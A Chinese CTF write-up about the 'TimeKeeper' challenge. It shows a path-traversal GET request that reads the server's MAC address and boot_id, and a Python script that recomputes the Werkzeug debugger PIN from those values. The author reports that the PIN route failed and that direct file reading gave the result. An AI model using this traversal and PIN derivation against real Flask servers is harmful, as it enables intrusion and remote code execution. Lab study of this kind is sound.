ailx10说：这篇是我2025年2月写的。TimeKeeper 最后没有按我原先设想的 PIN 路线结束。我先从购物参数的报错看到 Flask 线索，再用文件读取收集用户、MAC 和启动脚本，想着把 PIN 复算出来；结果官方题解照着试也没成功，反倒是直接读文件拿到了结果。我还为此单开了两套本地环境，分别留下前两篇实验。这篇就把这次卡住和换路写清楚：文件读取成功是真的，PIN 算不出也是真的，不能为了让故事顺一点，就把两者合成一次已经验证的调试器突破。

PIN 码的生成是依赖下面2个变量

```
probably_public_bits = [

    username, # 用户名(ctf) 从/etc/passwd页面可以看到home路径下有ctf用户

    modname, # flask.app

    getattr(app, '__name__', getattr(app.__class__, '__name__')), # Flask

    getattr(mod, '__file__', None), # /usr/local/lib/python2.7/dist-packages/flask/app.py

]



private_bits = [

    str(uuid.getnode()), ### MAC 地址的十进制

    get_machine_id(), ### /etc/machine-id 或 /proc/sys/kernel/random/boot_id

]
```

查看MAC地址，得到MAC地址是：`02:3d:2c:d9:f3:de` （每次实验都会变化）

```
GET /asserts/../../../../sys/class/net/eth0/address HTTP/1.1
```

![](/notes-assets/a36d3b87fdc7621627be.webp)

转换成十进制数是：`2461768741854`

```
hex_mac = "023d2cd9f3de"

decimal_mac = int(hex_mac, 16)

print(decimal_mac)
```

查看 `/etc/machine-id` 是空的，查看 `/proc/sys/kernel/random/boot_id` 有值 `ed5d2fe8-08f0-4b55-b7fa-1020b9cf6b01`（机器名，我2次实验过程中值不变）

![](/notes-assets/a477c850fbc0a9773044.webp)

基于这些值计算 PIN 码，得到：366-532-584

```
import hashlib

from itertools import chain





def generate_cookie_identifier(probably_public_bits, private_bits):

    h = hashlib.md5()



    # 更新哈希对象，使用chain来连接两个列表，并确保非空字符串被编码

    for bit in chain(probably_public_bits, private_bits):

        if bit:  # 只处理非空值

            h.update(bit.encode('utf-8') if isinstance(bit, str) else bit)



    h.update(b'cookiesalt')



    cookie_name_base = '__wzd' + h.hexdigest()[:20]



    # 计算数字部分

    h.update(b'pinsalt')

    num = ('%09d' % int(h.hexdigest(), 16))[:9]



    # 格式化输出

    for group_size in 5, 4, 3:

        if len(num) % group_size == 0:

            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size))

            break

    else:

        rv = num



    return cookie_name_base, rv







probably_public_bits = [

    'ctf',

    'flask.app',

    'Flask',

    '/usr/local/lib/python2.7/dist-packages/flask/app.py'

]



private_bits = [

    '2461768741854',

    'ed5d2fe8-08f0-4b55-b7fa-1020b9cf6b01'

]



_, formatted_number = generate_cookie_identifier(probably_public_bits, private_bits)



print(formatted_number)
```
